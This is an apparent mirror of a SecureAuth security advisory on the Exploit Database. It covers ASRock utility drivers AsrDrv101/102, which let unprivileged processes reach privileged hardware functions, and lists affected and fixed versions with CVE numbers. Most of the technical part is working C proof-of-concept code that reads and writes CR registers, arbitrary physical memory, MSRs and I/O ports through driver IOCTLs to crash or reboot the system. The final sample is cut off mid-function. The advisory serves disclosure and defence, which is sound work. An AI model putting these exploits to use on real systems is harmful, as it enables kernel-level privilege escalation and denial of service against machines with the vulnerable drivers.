3. *Vulnerability Description*

ASRock's website states that [1]:

ASRock Inc. is established in 2002, specialized in the field of
motherboards. With the 3C design concept, Creativity, Consideration,
Cost-effectiveness, the company explores the limit of motherboards
manufacturing while paying attention on the eco issue at the same
time, developing products with the consideration of eco-friendly
concept. ASRock has been growing fast and become world third largest
motherboard brand with headquarter in Taipei, Taiwan and branches in
Europe and the USA.

ASRock offers several utilities designed to give the user with an ASRock
motherboard more control over certain settings and functions.
These utilities include various features like the RGB LED control,
hardware monitor, fan controls, and overclocking/voltage options.

Multiple vulnerabilities were found in AsrDrv101.sys and AsrDrv102.sys
low level drivers, installed by ASRock RGBLED and other ASRock branded
utilities, which could allow a local attacker to elevate privileges.

4. *Vulnerable Packages*

   . ASRock RGBLED before v1.0.35.1
   . A-Tuning before v3.0.210
   . F-Stream before v3.0.210
   . RestartToUEFI before v1.0.6.2

5. *Vendor Information, Solutions and Workarounds*

ASRock published the following fixed applications for each of its
motherboards models:

   . ASRock RGBLED v1.0.36
   . A-Tuning v3.0.216
   . F-Stream v3.0.216
   . RestartToUEFI v1.0.7

Downloads are available on the ASRock website.

6. *Credits*

These vulnerabilities were discovered and researched by Diego Juarez.
The publication of this advisory was coordinated by Leandro Cuozzo
from SecureAuth Advisories Team.

7. *Technical Description / Proof of Concept Code*

ASRock's RBGLED, A-Tuning, F-Stream, RestartToUEFI, and possibly others,
use a low level driver to program and query the status on embedded ICs
on their hardware. Fan curves, clock frequencies, LED colors, thermal
performance, and other user customizable properties and monitoring
functionality are exposed to applications through this low level kernel
driver.

The main subjects of this advisory are the device drivers
installed/loaded by these utilities (AsrDrv101.sys and ArsDrv102.sys).
>From now on addressed as "AsrDrv". Default installation allows
non-privileged user processes (even running at LOW INTEGRITY) to get a
HANDLE and issue IOCTL codes to the driver.

The following sections describe the problems found.

7.1. *CR register access*

[CVE-2018-10709]

AsrDrv exposes functionality to read and write CR register values. This
could be leveraged in a number of ways to ultimately run code with
elevated privileges.

/-----
// Asrock RGBLED PoC demonstrating non-privileged access to CR registers

#include <windows.h>
#include <stdio.h>

#define IOCTL_ASROCK_READCR 0x22286C
#define IOCTL_ASROCK_WRITECR 0x222870

HANDLE ghDriver = 0;

#pragma pack (push,1)

typedef struct _ASROCK_CR_STRUCT {
    ULONG64 reg;
    ULONG64 value;
} ASROCK_CR_STRUCT;

#pragma pack(pop)

#define IOCTLMACRO(iocontrolcode, size) \
    ULONG64 outbuffer[2] = { 0 };    \
    DWORD returned = 0;    \
    DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);    \
    return outbuffer[1];    \

ULONG64 ASROCK_ReadCR(DWORD reg)
{
    ASROCK_CR_STRUCT  inbuffer = { 3, 0};
    IOCTLMACRO(IOCTL_ASROCK_READCR, 10)
}

ULONG64 ASROCK_WriteCR(DWORD reg, ULONG64 value)
{
    ASROCK_CR_STRUCT  inbuffer = { reg, value};
    IOCTLMACRO(IOCTL_ASROCK_WRITECR, 10)
}

BOOL InitDriver()
{
    char szDeviceName[] = "\\\\.\\AsrDrv101";
    ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (ghDriver == INVALID_HANDLE_VALUE) {
        printf("Cannot get handle to driver object \'%s\'- GetLastError:%d\n", szDeviceName, GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char* argv[])
{
    printf("Asrock RGBLED PoC (CR access) - pnx!/CORE\n");

    if (!InitDriver()) {
        printf("InitDriver failed! - aborting...\n");
        exit(0);
    }

    ULONG64 a = ASROCK_ReadCR(3);
    printf("CR3 (PageDir): %llx\n", a);
    printf("press ENTER for instant system CRASH\n");
    getchar();

    a = ASROCK_WriteCR(3, 0xffff1111ffff2222);

    CloseHandle(ghDriver);
}
-----/

7.2. *Arbitrary physical memory read/write*

[CVE-2018-10710]

AsrDrv's IOCTL code 0x22280C exposes a functionality to read and write
arbitrary physical memory, this could be leveraged by a local attacker
to elevate privileges.

Proof of Concept:

/-----
// Asrock RGBLED PoC (arbitrary physical memory write)
// This PoC demonstrates arbitrary write to physical memory.

#include <windows.h>
#include <stdio.h>

#define IOCTL_ASROCK_WRITEPH 0x22280C

HANDLE ghDriver = 0;

#pragma pack (push,1)

typedef struct _ASROCK_PH_STRUCT {
    ULONG64 destPhysical;
    DWORD size;
    DWORD unk0;
    ULONG64 src;
} ASROCK_PH_STRUCT;

#pragma pack(pop)

BOOL ASROCK_ph_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
{
    ASROCK_PH_STRUCT mystructIn = { dest, size, 0, src};

    BYTE outbuffer[0x30] = { 0 };

    DWORD returned = 0;
    DeviceIoControl(ghDriver, IOCTL_ASROCK_WRITEPH, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
    if (returned) {
        return TRUE;
    }
    return FALSE;
}

BOOL InitDriver()
{
    char szDeviceName[] = "\\\\.\\AsrDrv101";
    ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (ghDriver == INVALID_HANDLE_VALUE) {
        printf("Cannot get handle to driver \'%s\'- GetLastError:%d\n", szDeviceName, GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char * argv[])
{
    printf("Asrock RGBLED PoC (arbitrary physical memory write) - pnx!/CORE\n");
    if (!InitDriver()) {
        exit(0);
    }

    printf("press ENTER for SYSTEM CRASH\n");
    getchar();
    ULONG64 data = 0xFFFF1111FFFF2222;
    for (unsigned int i = 0; i < 0xffffffff; i += 0x1000) {
        printf(".");
        ASROCK_ph_memcpy(i, (ULONG64)&data, 8);
    }

    CloseHandle(ghDriver);
    return 0;
}
-----/

7.3. *MSR Register access*

[CVE-2018-10711]

AsrDrv exposes functionality to read and write Machine Specific
Registers (MSRs). This could be leveraged to execute arbitrary ring-0
code.

Proof of Concept:

/-----
// Asrock RGBLED PoC demonstrating non-privileged access to MSR registers

// This PoC demonstrates non privileged MSR access by reading
// IA32_LSTAR value (leaks a kernel function pointer bypassing KASLR)
// and then writing garbage to it (instant BSOD!)

#include <windows.h>
#include <stdio.h>

#define IOCTL_ASROCK_RDMSR 0x222848
#define IOCTL_ASROCK_WRMSR 0x22284C

HANDLE ghDriver = 0;

#pragma pack (push,1)

typedef struct _ASROCK_MSRIO_STRUCT {
    ULONG64 valLO;            //
    DWORD reg;            //
    ULONG64 valHI;        //
} ASROCK_MSRIO_STRUCT;

#pragma pack(pop)

#define IOCTLMACRO(iocontrolcode, size) \
    ASROCK_MSRIO_STRUCT outbuffer = { 0 };\
    DWORD returned = 0;    \
    DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)&outbuffer, sizeof(outbuffer), &returned, NULL);    \
    return (outbuffer.valHI<<0x20 | outbuffer.valLO);    \

ULONG64 GIO_RDMSR(DWORD reg)
{
    ASROCK_MSRIO_STRUCT inbuffer = { 0, reg };
    IOCTLMACRO(IOCTL_ASROCK_RDMSR, 20)
}

ULONG64 GIO_WRMSR(DWORD reg, ULONG64 value)
{
    ASROCK_MSRIO_STRUCT inbuffer = { value & 0xffffffff, reg, (value & 0xffffffff00000000)>>0x20 };
    IOCTLMACRO(IOCTL_ASROCK_WRMSR, 20)
}

BOOL InitDriver()
{
    char szDeviceName[] = "\\\\.\\AsrDrv101";
    ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (ghDriver == INVALID_HANDLE_VALUE) {
        printf("Cannot get handle to driver object \'%s\'- GetLastError:%d\n", szDeviceName, GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char * argv[])
{
    printf("Asrock RGBLED PoC (MSR access) - pnx!/CORE\n");

    if (!InitDriver()) {
        printf("InitDriver failed! - aborting...\n");
        exit(0);
    }

    ULONG64 a = GIO_RDMSR(0xC0000082);

    printf("press ENTER for instant BSOD\n");
    getchar();

    a = GIO_WRMSR(0xC0000082, 0xffff1111ffff2222);
    return (int)CloseHandle(ghDriver);
}
-----/

7.4. *Port mapped I/O access*

[CVE-2018-10712]

AsrDrv exposes functionality to read/write data from/to IO ports. This
could be leveraged in a number of ways to ultimately run code with
elevated privileges.

/-----
// Asrock RGBLED PoC demonstrating non-privileged access to IO ports

#include <windows.h>
#include <stdio.h>

#define IOCTL_ASROCK_PORTREADB 0x222810
#define IOCTL_ASROCK_PORTWRITEB 0x222814

HANDLE ghDriver = 0;

#pragma pack (push,1)

typedef struct _ASROCK_CR_STRUCT {
    DWORD port;
    ULONG64 value;
} ASROCK_CR_STRUCT;

#pragma pack(pop)

#define IOCTLMACRO(iocontrolcode, size) \
    BYTE outbuffer[0x10] = { 0 };    \
    DWORD returned = 0;    \
    DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);    \
    return outbuffer[1];    \

BYTE ASROCK_ReadPortB(DWORD port)
{
    ASROCK_CR_STRUCT  inbuffer = { port, 0};
    IOCTLMACRO(IOCTL_ASROCK_PORTREADB, 10)
}

BYTE ASROCK_WritePortB(DWORD port, ULONG64 value)
{
    ASROCK_CR_STRUCT  inbuffer = { port, value};
    IOCTLMACRO(IOCTL_ASROCK_PORTWRITEB, 10)
}

void Reboot()
{
    BYTE cf9 = ASROCK_ReadPortB(0xcf9) & ~0x6;
    ASROCK_WritePortB(0xcf9, cf9 | 2);
    Sleep(50);

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
